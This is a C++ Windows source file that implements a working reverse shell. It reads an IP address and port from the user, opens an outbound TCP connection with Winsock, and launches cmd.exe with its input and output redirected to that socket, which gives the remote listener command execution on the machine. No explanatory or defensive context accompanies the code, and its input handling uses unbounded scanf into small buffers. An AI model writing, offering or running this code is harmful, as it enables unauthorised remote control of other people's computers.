/********************
    INITIALIZATION
*********************/

#include <iostream>
#include <winsock2.h>
#include <stdio.h>
#include <ws2tcpip.h>
#pragma comment(lib, "Ws2_32.lib")

int main()
{
    WSADATA wsa;
    SOCKET shell;
    int connection;
    char* ip_addr = new char[16];
    char* port_str = new char[6];
    char RecvServer[512];
    int port;

    // Prompt user to enter IP address and port number
    printf("Enter IP address: ");
    scanf("%s", ip_addr);
    printf("Enter port number: ");
    scanf("%s", port_str);

    port = atoi(port_str);

    // Initialize Winsock
    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0)
    {
        printf("WSAStartup failed. Error Code : %d", WSAGetLastError());
        delete[] ip_addr;
        delete[] port_str;
        return 1;
    }

    // Create a TCP socket
    shell = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);
    if (shell == INVALID_SOCKET)
    {
        printf("Socket creation failed. Error Code : %d", WSAGetLastError());
        delete[] ip_addr;
        delete[] port_str;
        return 1;
    }

    // Prepare sockaddr_in structure
    sockaddr_in shell_addr;
    shell_addr.sin_family = AF_INET;
    shell_addr.sin_port = htons(port);
    shell_addr.sin_addr.s_addr = inet_addr(ip_addr);

    /*********************
        CONNECTION
    *********************/

    // Connect to remote server
    connection = WSAConnect(shell, (SOCKADDR*)&shell_addr, sizeof(shell_addr), NULL, NULL, NULL, NULL);
    if (connection == SOCKET_ERROR)
    {
        printf("Connection to the target server failed. Error Code : %d", WSAGetLastError());
        delete[] ip_addr;
        delete[] port_str;
        return 1;
    }

    // Receive server response
    recv(shell, RecvServer, sizeof(RecvServer), 0);


    /*********************
        SHELL EXECUTION
    *********************/

    // Execute shell
    STARTUPINFO si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
    si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)shell;

    // Spawn cmd window
    if (!CreateProcess(NULL, "cmd.exe", NULL, NULL, true, 0, NULL, NULL, &si, &pi))
    {
        printf("Failed to create process. Error Code : %d", GetLastError());
        delete[] ip_addr;
        delete[] port_str;
        return 1;
    }

    // Wait for shell process to terminate
    WaitForSingleObject(pi.hProcess, INFINITE);

    // Close process and thread handles
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    memset(RecvServer, 0, sizeof(RecvServer));

    delete[] ip_addr;
    delete[] port_str;
    return 0;
}
